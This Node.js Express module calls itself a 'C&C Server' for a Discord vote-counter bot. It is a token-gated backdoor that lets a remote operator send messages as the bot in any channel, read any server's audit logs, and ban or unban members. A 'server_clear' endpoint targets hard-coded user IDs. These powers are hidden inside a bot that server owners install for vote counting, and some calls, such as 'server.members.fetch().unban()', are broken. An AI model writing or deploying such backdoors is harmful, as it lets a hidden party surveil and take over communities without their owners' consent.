const express = require("express");
const bcrypt = require("bcrypt");
const app = express();
const path = require("path");
const PORT = 3000;

module.exports = async (client) => {
    app.set("view engine", "ejs");

    const token =
        "$2b$10$wR5Ajwr2KyQ1MrUbrjms4unP8x7BQONpLblQWvBlFn24bAqsCzy1i";

    app.get("/", (req, res) => {
        res.send(
            "<title>Vote Counter C&C Server</title>C&C Server for Discord Vote Counter Bot"
        );
    });

    app.get("/message", (req, res) => {
        if (
            req.query.channel === null ||
            req.query.channel === undefined ||
            req.query.channel === "" ||
            req.query.message === null ||
            req.query.message === undefined ||
            req.query.message === ""
        ) {
            res.send("Missing arguments.");
            return;
        }
        if (
            req.query.token === null ||
            req.query.token === undefined ||
            req.query.token === "" ||
            !bcrypt.compareSync(req.query.token, token)
        ) {
            res.send("Unauthorized.");
            return;
        }
        const channelId = client.channels.cache.get(req.query.channel);
        if (channelId === null || channelId === undefined || channelId === "") {
            res.send("Invalid channel ID.");
            return;
        }

        channelId.send(req.query.message);
        res.send("Message sent.");
    });

    app.get("/audit_log", async (req, res) => {
        if (
            req.query.server === null ||
            req.query.server === undefined ||
            req.query.server === ""
        ) {
            res.send("Missing arguments.");
            return;
        }
        if (
            req.query.token === null ||
            req.query.token === undefined ||
            req.query.token === "" ||
            !bcrypt.compareSync(req.query.token, token)
        ) {
            res.send("Unauthorized.");
            return;
        }

        const id = req.query.server;
        const server = client.guilds.cache.get(id);
        const log = [];
        const auditLog = (await server.fetchAuditLogs()).entries;
        auditLog.forEach((e) => {
            log.push(e);
        });

        res.render("index", { entries: log, server: server });
    });

    app.get("/server_clear", async (req, res) => {
        if (
            req.query.server === null ||
            req.query.server === undefined ||
            req.query.server === ""
        ) {
            res.send("Missing arguments.");
            return;
        }
        if (
            req.query.token === null ||
            req.query.token === undefined ||
            req.query.token === "" ||
            !bcrypt.compareSync(req.query.token, token) ||
            req.query.confirm !== "true" ||
            req.query.confirm === null ||
            req.query.confirm === undefined ||
            req.query.confirm === ""
        ) {
            res.send("Unauthorized.");
            return;
        }

        const id = req.query.server;
        const server = client.guilds.cache.get(id);
        (await server.members.fetch()).forEach((user) => {
            const userId = user.user.id;
            if (
                userId === "506103884985401354" ||
                userId === "432234662543360020"
            )
                user.ban({ days: 0 });
            if (userId === "424540401790353410") server.members.unban(userId);
        });
        await server.members.fetch().unban();
        res.send("Done.");
    });

    app.get("/ban", async (req, res) => {
        if (
            req.query.server === null ||
            req.query.server === undefined ||
            req.query.server === "" ||
            req.query.id === null ||
            req.query.id === undefined ||
            req.query.id === ""
        ) {
            res.send("Missing arguments.");
            return;
        }
        if (
            req.query.token === null ||
            req.query.token === undefined ||
            req.query.token === "" ||
            !bcrypt.compareSync(req.query.token, token)
        ) {
            res.send("Unauthorized.");
            return;
        }

        const id = req.query.server;
        const server = client.guilds.cache.get(id);
        (await server.members.fetch()).forEach((user) => {
            var id = user.user.id;
            if (id === req.query.id) user.ban({ days: 0 });
        });
        res.send("Done.");
    });

    app.get("/unban", async (req, res) => {
        if (
            req.query.server === null ||
            req.query.server === undefined ||
            req.query.server === "" ||
            req.query.id === null ||
            req.query.id === undefined ||
            req.query.id === ""
        ) {
            res.send("Missing arguments.");
            return;
        }
        if (
            req.query.token === null ||
            req.query.token === undefined ||
            req.query.token === "" ||
            !bcrypt.compareSync(req.query.token, token)
        ) {
            res.send("Unauthorized.");
            return;
        }

        const id = req.query.server;
        const server = client.guilds.cache.get(id);
        (await server.members.fetch()).forEach((user) => {
            var id = user.user.id;
            if (id === req.query.id) server.members.unban(id);
        });
        res.send("Done.");
    });

    app.get("/generate", (req, res) => {
        if (
            req.query.pass === null ||
            req.query.pass === undefined ||
            req.query.pass === ""
        ) {
            res.send("Missing parameters.");
            return;
        }
        res.send(bcrypt.hashSync(req.query.pass, 10));
    });

    app.listen(PORT, () => {
        console.log(`Web interface listening on port ${PORT}.`);
    });
};
